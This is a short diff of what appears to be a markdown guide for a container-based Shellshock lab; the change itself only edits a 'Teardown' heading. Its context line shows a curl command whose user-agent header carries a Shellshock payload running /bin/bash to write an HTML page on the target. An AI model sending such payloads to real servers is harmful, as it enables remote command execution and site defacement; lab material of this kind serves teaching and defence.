@@ -30,7 +30,7 @@ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1
 
 * Step 5: Open another browser tab, on the address bar, add `:8080` and press `Enter`. and check the site.
 
-## Teardown:
+## Teardown
 
 * Stop all containers
 
